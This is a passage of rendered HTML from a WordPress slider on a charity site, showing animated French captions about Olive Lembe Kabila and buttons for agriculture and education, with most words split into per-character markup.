+							--><rs-layer-wrap class="rs-parallax-wrap rs-forcehidden" style="position: absolute; display: block; pointer-events: none; left: 972.5px; top: 141px; z-index: 10; visibility: hidden;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; transform-origin: 50% 50% 0px; overflow: visible;"><rs-layer id="slider-3-slide-16-layer-1" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:917px,402px,277px,127px;yo:141px,246px,243px,238px;" data-text="s:22;l:24;" data-dim="w:287px;" data-frame_0="o:1;" data-frame_0_chars="d:5;x:105%;o:1;rX:45deg;rY:0deg;rZ:90deg;" data-frame_0_mask="u:t;" data-frame_1="e:power4.inOut;st:500;sp:2000;" data-frame_1_chars="d:5;" data-frame_1_mask="u:t;" data-frame_999="o:0;e:nothing;st:w;" style="z-index: 10; font-family: Montserrat; height: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; width: 287px; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: left; line-height: 24px; letter-spacing: 0px; font-size: 22px; transform-style: preserve-3d; transform-origin: 50% 50% 0px; transform: perspective(600px); opacity: 0; visibility: visible;" class="rs-layer" data-idcheck="true" data-stylerecorder="true" data-initialised="true"><div class="rs_splitted_lines" style="display: block; text-align: left; position: relative;"><div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">F</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">M</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">M</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">D</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">G</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">R</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">A</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">N</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">D</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">F</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">O</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">I</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">,</div></div> </div></rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap rs-forcehidden" style="position: absolute; display: block; pointer-events: none; left: 860.5px; top: 161px; z-index: 8; visibility: hidden; perspective: 601px;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; overflow: visible;"><rs-layer id="slider-3-slide-16-layer-2" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:805px,257px,117px,540px;yo:161px,287px,294px,197px;" data-text="s:44;l:38;fw:700;a:center;" data-frame_1="e:power2.inOut;st:500;sp:480;" data-frame_999="o:0;e:nothing;st:w;" style="z-index: 8; font-family: Montserrat; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: center; line-height: 38px; letter-spacing: 0px; font-weight: 700; font-size: 44px; transform-origin: 50% 50% 0px; opacity: 0; transform: translate(0px, 0px); visibility: visible;" class="rs-layer" data-idcheck="true" data-stylerecorder="true" data-initialised="true">OLIVE LEMBE KABILA 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap rs-forcehidden" style="position: absolute; display: block; pointer-events: none; left: 1021.5px; top: 249px; z-index: 9; visibility: hidden; perspective: 601px;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; overflow: visible;"><rs-layer id="slider-3-slide-16-layer-4" class="ocend-btn rev-btn rs-layer" data-type="button" data-color="rgba(255,255,255,1)" data-xy="xo:966px,283px,144px,121px;yo:249px,450px,452px,314px;" data-text="s:17;l:17;fw:500;" data-rsp_bd="off" data-padding="t:12;r:35;b:12;l:35;" data-frame_0="x:-50px;" data-frame_1="e:power2.inOut;st:500;sp:920;" data-frame_999="o:0;e:nothing;st:w;" data-frame_hover="c:#000;bgc:#fff;boc:#000;bor:0px,0px,0px,0px;bos:solid;oX:50;oY:50;sp:0;e:none;" style="z-index: 9; background-color: rgba(255, 100, 0, 0.74902); font-family: Roboto; cursor: pointer; outline: none; box-shadow: none; box-sizing: border-box; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: left; line-height: 17px; letter-spacing: 0px; font-weight: 500; font-size: 17px; border-color: transparent; padding: 12px 35px; border-radius: 3px; transform-origin: 50% 50% 0px; opacity: 0; transform: translate(0px, 0px); visibility: visible;" data-idcheck="true" data-stylerecorder="true" data-initialised="true">Agriculture 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+-->						</rs-slide>
+						<rs-slide data-key="rs-17" data-title="Slide" data-in="o:0;" data-out="a:false;" data-originalindex="4" data-origindex="3" data-description="" data-sba="" data-scroll-based="false" style="overflow: hidden; height: 100%; width: 100%; z-index: 20; opacity: 1; visibility: inherit;" data-owidth="1024" data-oheight="635" data-rspausetimeronce="0" data-isactiveslide="true"><rs-sbg-px><rs-sbg-wrap data-key="rs-17" data-owidth="1024" data-oheight="635"><!--Runtime Modification - Img tag is Still Available for SEO Goals in Source - <img src="//www.initiativeplus-olk.org/wp-content/uploads/2021/03/4olkslider-copie.jpg" title="4olkslider copie" width="1024" height="635" data-bg="p:center top;" data-panzoom="d:10000;ss:100;se:105;" class="rev-slidebg" data-no-retina="">--><rs-sbg class="" data-bgcolor="transparent" style="width: 100%; height: 100%;" data-src-rs-ref="https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/4olkslider-copie.jpg"><canvas style="width: 100%; height: 100%; background-color: transparent; opacity: 1; filter: none;" width="1351" height="868"></canvas></rs-sbg></rs-sbg-wrap></rs-sbg-px>
+							
+<!--
+							--><rs-layer-wrap class="rs-parallax-wrap " style="position: absolute; display: block; pointer-events: auto; left: 707.5px; top: 272px; z-index: 11; visibility: visible;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; transform-origin: 50% 50% 0px; transform: translate(0px, 0px); overflow: hidden;"><rs-layer id="slider-3-slide-17-layer-0" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:652px,402px,277px,127px;yo:272px,246px,243px,238px;" data-text="s:22;l:24;" data-frame_0="o:1;" data-frame_0_chars="d:5;x:105%;o:1;rX:45deg;rY:0deg;rZ:90deg;" data-frame_0_mask="u:t;" data-frame_1="e:power4.inOut;st:500;sp:2000;" data-frame_1_chars="d:5;" data-frame_1_mask="u:t;" data-frame_999="o:0;e:nothing;st:w;" style="z-index: 11; font-family: Montserrat; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: left; line-height: 24px; letter-spacing: 0px; font-size: 22px; transform-style: preserve-3d; transform-origin: 50% 50% 0px; transform: perspective(600px); opacity: 1; visibility: visible;" class="rs-layer" data-idcheck="true" data-stylerecorder="true" data-initialised="true"><div class="rs_splitted_lines" style="display: block; text-align: left; position: relative;"><div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">n</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">d</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">o</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">n</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">n</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">n</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">t</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">à</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">c</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">h</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">q</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">u</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">n</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">f</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">n</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">t</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">c</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">h</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">n</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">c</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">d</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">'</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">r</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">à</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">'</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">é</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">c</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">o</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> </div></rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap " style="position: absolute; display: block; pointer-events: auto; left: 719.5px; top: 207px; z-index: 10; visibility: visible;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; transform-origin: 50% 50% 0px; transform: translate(0px, 0px); overflow: hidden;"><rs-layer id="slider-3-slide-17-layer-1" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:664px,402px,277px,127px;yo:207px,246px,243px,238px;" data-text="s:22;l:24;" data-dim="w:577px;" data-frame_0="o:1;" data-frame_0_chars="d:5;x:105%;o:1;rX:45deg;rY:0deg;rZ:90deg;" data-frame_0_mask="u:t;" data-frame_1="e:power4.inOut;st:500;sp:2000;" data-frame_1_chars="d:5;" data-frame_1_mask="u:t;" data-frame_999="o:0;e:nothing;st:w;" style="z-index: 10; font-family: Montserrat; height: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; width: 577px; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: left; line-height: 24px; letter-spacing: 0px; font-size: 22px; transform-style: preserve-3d; transform-origin: 50% 50% 0px; transform: perspective(600px); opacity: 1; visibility: visible;" class="rs-layer" data-idcheck="true" data-stylerecorder="true" data-initialised="true"><div class="rs_splitted_lines" style="display: block; text-align: left; position: relative;"><div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">V</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">é</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">r</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">t</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">b</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">M</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">t</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">r</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">r</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">c</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">h</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">,</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">O</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">l</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">v</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">e</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">L</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">M</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">B</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">E</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">K</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">A</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">B</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">I</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">L</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">A</div></div> </div></rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap " style="position: absolute; display: block; pointer-events: auto; left: 689.5px; top: 229px; z-index: 8; visibility: visible; perspective: 601px;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; overflow: visible;"><rs-layer id="slider-3-slide-17-layer-2" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:634px,257px,117px,540px;yo:229px,287px,294px,197px;" data-text="s:44;l:38;fw:700;a:center;" data-frame_1="e:power2.inOut;st:500;sp:480;" data-frame_999="o:0;e:nothing;st:w;" style="z-index: 8; font-family: Montserrat; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: center; line-height: 38px; letter-spacing: 0px; font-weight: 700; font-size: 44px; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); visibility: visible;" class="rs-layer" data-idcheck="true" data-stylerecorder="true" data-initialised="true">INVESTI DANS LE CERVEAU 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
+							--><rs-layer-wrap class="rs-parallax-wrap " style="position: absolute; display: block; pointer-events: auto; left: 873.5px; top: 315px; z-index: 9; visibility: visible; perspective: 601px;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; overflow: visible;"><rs-layer id="slider-3-slide-17-layer-4" class="ocend-btn rev-btn rs-layer" data-type="button" data-color="rgba(255,255,255,1)" data-xy="xo:818px,283px,144px,121px;yo:315px,450px,452px,314px;" data-text="s:17;l:17;fw:500;" data-rsp_bd="off" data-padding="t:12;r:35;b:12;l:35;" data-frame_0="x:-50px;" data-frame_1="e:power2.inOut;st:500;sp:920;" data-frame_999="o:0;e:nothing;st:w;" data-frame_hover="c:#000;bgc:#fff;boc:#000;bor:0px,0px,0px,0px;bos:solid;oX:50;oY:50;sp:0;e:none;" style="z-index: 9; background-color: rgba(255, 100, 0, 0.74902); font-family: Roboto; cursor: pointer; outline: none; box-shadow: none; box-sizing: border-box; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: left; line-height: 17px; letter-spacing: 0px; font-weight: 500; font-size: 17px; border-color: transparent; padding: 12px 35px; border-radius: 3px; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); visibility: visible;" data-idcheck="true" data-stylerecorder="true" data-initialised="true">Education 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+-->						</rs-slide>
+						<rs-slide data-key="rs-18" data-title="Slide" data-in="o:0;" data-out="a:false;" data-originalindex="5" data-origindex="4" data-description="" data-sba="" data-scroll-based="false" style="overflow: hidden; height: 100%; width: 100%;"><rs-sbg-px><rs-sbg-wrap data-key="rs-18"><!--Runtime Modification - Img tag is Still Available for SEO Goals in Source - <img src="//www.initiativeplus-olk.org/wp-content/uploads/2021/03/3olkslider-copie.jpg" title="3olkslider copie" width="1024" height="635" data-bg="p:center top;" data-panzoom="d:10000;ss:100;se:105;" class="rev-slidebg" data-no-retina="">--><rs-sbg class="" data-bgcolor="transparent" style="width: 100%; height: 100%;"><canvas style="width: 100%; height: 100%;"></canvas></rs-sbg></rs-sbg-wrap></rs-sbg-px>
+							
+<!--
+							--><rs-layer-wrap class="rs-parallax-wrap " style=" position:absolute;display:block;;pointer-events:none"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position:absolute;display:block;"><rs-layer id="slider-3-slide-18-layer-1" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:660px,402px,277px,127px;yo:95px,246px,243px,238px;" data-text="s:22;l:24;" data-dim="w:577px;" data-frame_0="o:1;" data-frame_0_chars="d:5;x:105%;o:1;rX:45deg;rY:0deg;rZ:90deg;" data-frame_0_mask="u:t;" data-frame_1="e:power4.inOut;st:500;sp:2000;" data-frame_1_chars="d:5;" data-frame_1_mask="u:t;" data-frame_999="o:0;e:nothing;st:w;" style="z-index:10;font-family:Montserrat;" class="rs-layer" data-idcheck="true">Tout en améliorant la qualité de vie d'une personne, 
+							</rs-layer></rs-mask-wrap></rs-loop-wrap></rs-layer-wrap><!--
+
